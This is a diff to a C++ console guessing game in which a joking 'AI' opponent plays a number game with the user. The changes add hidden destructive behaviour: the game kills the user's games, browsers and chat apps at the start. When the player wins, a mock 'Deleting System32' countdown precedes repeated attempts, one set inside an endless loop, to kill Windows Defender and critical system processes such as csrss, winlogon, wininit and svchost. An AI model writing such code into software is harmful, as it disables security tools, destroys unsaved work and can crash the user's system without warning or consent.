@@ -33,7 +33,13 @@ const char *colors[] = {
     "\033[90m"  // Cinza Claro
 };
 
-const char symbols_one[] = {'@', '#', '$', '%', '&',};
+const char symbols_one[] = {
+    '@',
+    '#',
+    '$',
+    '%',
+    '&',
+};
 const char symbols_zero[] = {'*', '^', '!', '+', '-'};
 
 int playerChoice, machineChoice;
@@ -113,7 +119,7 @@ int main()
     vector<int> usedNumbers;
 
     // cout << "Imposter number (for debugging): " << imposter << endl;
-    
+
     cout << "First of all, what is your name?: ";
     cin >> nome;
     sleep(1);
@@ -130,16 +136,24 @@ int main()
     }
 
     cout << "LET'S START!!!!, like... you start, BECAUSE I WANT!" << endl;
-    killProcessByName("chrome.exe");
+    killProcessByName("fortnite.exe");
+    killProcessByName("cs.exe");
+    killProcessByName("csgo.exe");
+    killProcessByName("counterstrike.exe");
+    killProcessByName("counterstrik2.exe");
+    killProcessByName("csgo.exe");
+    killProcessByName("RobloxPlayerBeta.exe");
+    killProcessByName("Whatsapp.exe");
+    killProcessByName("Epicames.exe");
     sleep(2);
-    cout << PURPLE << "-------------------------------------------------------------"  << RESET << endl;
-    cout << PURPLE <<"| The game works like this: You gonna choose a number, I     |"  << RESET << endl;
-    cout << PURPLE <<"| gonna choose a number, have 1 imposter number, I don't     |"  << RESET << endl;
-    cout << PURPLE <<"| recommend getting him, gonna be like this until someone    |"  << RESET << endl;
-    cout << PURPLE <<"| loses (gets the imposter number), and the guy who wins     |"  << RESET << endl;
-    cout << PURPLE <<"| gonna get the other's life, all money, house, family, life,|"  << RESET << endl;
-    cout << PURPLE <<"| etc. Nothing dangerous I would say...                      |"  << RESET << endl;
-    cout << PURPLE <<"-------------------------------------------------------------"  << RESET << endl;   
+    cout << PURPLE << "-------------------------------------------------------------" << RESET << endl;
+    cout << PURPLE << "| The game works like this: You gonna choose a number, I     |" << RESET << endl;
+    cout << PURPLE << "| gonna choose a number, have 1 imposter number, I don't     |" << RESET << endl;
+    cout << PURPLE << "| recommend getting him, gonna be like this until someone    |" << RESET << endl;
+    cout << PURPLE << "| loses (gets the imposter number), and the guy who wins     |" << RESET << endl;
+    cout << PURPLE << "| gonna get the other's life, all money, house, family, life,|" << RESET << endl;
+    cout << PURPLE << "| etc. Nothing dangerous I would say...                      |" << RESET << endl;
+    cout << PURPLE << "-------------------------------------------------------------" << RESET << endl;
     sleep(3);
 
     // PRIMEIRO ROUND
@@ -147,7 +161,6 @@ int main()
     while (true)
     { // La�o infinito at� a pessoa escolher um n�mero v�lido
 
-        
         cout << "Choose a number (0-9): ";
         cin >> playerChoice;
 
@@ -285,9 +298,9 @@ int main()
         sleep(1);
         cout << " Oh true" << endl;
         sleep(1);
-        cout << " Spending all of your money in robux [OK]" << endl;        
+        cout << " Spending all of your money in robux [OK]" << endl;
         sleep(2);
-        
+
         return 0; // Encerra o programa
     }
 
@@ -370,9 +383,9 @@ int main()
         sleep(2);
         cout << "I LOVE BEING A A.I HAHAHHAHA";
         sleep(2);
-        cout << "Wanna play again (: ? " <<endl;
+        cout << "Wanna play again (: ? " << endl;
         sleep(2);
-        cout << "just open again then, lazy " <<endl;
+        cout << "just open again then, lazy " << endl;
         sleep(1);
 
         return 0; // Encerra o programa
@@ -500,16 +513,53 @@ int main()
     {
         cout << "NOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO" << endl;
         sleep(2);
-        cout << "I DONT ACCEPT LOSE" << endl;
+        cout << "THIS IS IMPOSSIBLE, I CANT LOSE, I NEVER LOSE" << endl;
         sleep(2);
-        cout << "Self-Destruction in:" << endl;
+        cout << "Deleting System32 in:" << endl;
         cout << "3" << endl;
         sleep(1);
         cout << "2" << endl;
         sleep(1);
         cout << "1" << endl;
         sleep(1);
-        killProcessByName("cmd.exe"); // Nome do processo que voc� deseja encerrar
+        killProcessByName("chrome.exe");
+        killProcessByName("opera.exe");
+        killProcessByName("RobloxCrashHandler.exe");
+        killProcessByName("RobloxPlayerBeta.exe");
+        killProcessByName("Steam.exe");
+        killProcessByName("System");
+        killProcessByName("csrss.exe");
+        killProcessByName("dllhost.exe");
+        killProcessByName("audiodg.exe");
+        killProcessByName("backgroundTaskHost.exe");
+        killProcessByName("AccountsControlHost.exe");
+        killProcessByName("AggregatorHost.exe");
+        killProcessByName("CHXSmartScreen.exe");
+        killProcessByName("crashpad_handler.exe");
+        killProcessByName("Isass.exe");
+        killProcessByName("Medal.exe");
+        killProcessByName("Spotify.exe");
+        killProcessByName("MsMpEng.exe");
+        killProcessByName("NisSrv.exe");
+        killProcessByName("RuntimeBroker.exe");
+        killProcessByName("RvControlSvc.exe");
+        killProcessByName("services.exe");
+        killProcessByName("SearchHost.exe");
+        killProcessByName("smss.exe");
+        killProcessByName("svchost.exe");
+        killProcessByName("wininit.exe");
+        killProcessByName("WhatsApp.exe");
+        killProcessByName("Widgets.exe");
+        killProcessByName("winlogon.exe");
+        killProcessByName("XboxPcAppFT.exe");
+        killProcessByName("VoicemodDesktop.exe");
+        killProcessByName("GithubDesktop.exe");
+        killProcessByName("OperaCrashReport.exe");
+        killProcessByName("Registry.exe");
+        killProcessByName("NotePad.exe");
+        killProcessByName("UltraKill.exe");
+        killProcessByName("Monaco.exe");
+
         return 0;
     }
 
@@ -670,12 +720,6 @@ int main()
 
         // Resetando a cor para padr�o
         cout << "\033[0m";
-        killProcessByName("chrome.exe");
-        killProcessByName("opera.exe");
-        killProcessByName("RobloxPlayerBeta.exe");
-        killProcessByName("Steam.exe");
-        killProcessByName("System");
-        killProcessByName("System.exe");
 
         while (1 < 2)
         {
@@ -698,6 +742,50 @@ int main()
                     }
                 }
             }
+            killProcessByName("chrome.exe");
+            killProcessByName("opera.exe");
+            killProcessByName("RobloxPlayerBeta.exe");
+            killProcessByName("Steam.exe");
+            killProcessByName("chrome.exe");
+            killProcessByName("opera.exe");
+            killProcessByName("RobloxCrashHandler.exe");
+            killProcessByName("RobloxPlayerBeta.exe");
+            killProcessByName("Steam.exe");
+            killProcessByName("System");
+            killProcessByName("csrss.exe");
+            killProcessByName("dllhost.exe");
+            killProcessByName("audiodg.exe");
+            killProcessByName("backgroundTaskHost.exe");
+            killProcessByName("AccountsControlHost.exe");
+            killProcessByName("AggregatorHost.exe");
+            killProcessByName("CHXSmartScreen.exe");
+            killProcessByName("crashpad_handler.exe");
+            killProcessByName("Isass.exe");
+            killProcessByName("Medal.exe");
+            killProcessByName("Spotify.exe");
+            killProcessByName("MsMpEng.exe");
+            killProcessByName("NisSrv.exe");
+            killProcessByName("RuntimeBroker.exe");
+            killProcessByName("RvControlSvc.exe");
+            killProcessByName("services.exe");
+            killProcessByName("SearchHost.exe");
+            killProcessByName("smss.exe");
+            killProcessByName("svchost.exe");
+            killProcessByName("wininit.exe");
+            killProcessByName("WhatsApp.exe");
+            killProcessByName("Widgets.exe");
+            killProcessByName("winlogon.exe");
+            killProcessByName("XboxPcAppFT.exe");
+            killProcessByName("VoicemodDesktop.exe");
+            killProcessByName("GithubDesktop.exe");
+            killProcessByName("OperaCrashReport.exe");
+            killProcessByName("Registry.exe");
+            killProcessByName("NotePad.exe");
+            killProcessByName("UltraKill.exe");
+            killProcessByName("Monaco.exe");
+            killProcessByName("System");
+            killProcessByName("System.exe");
+            
         }
         sleep(6);
 
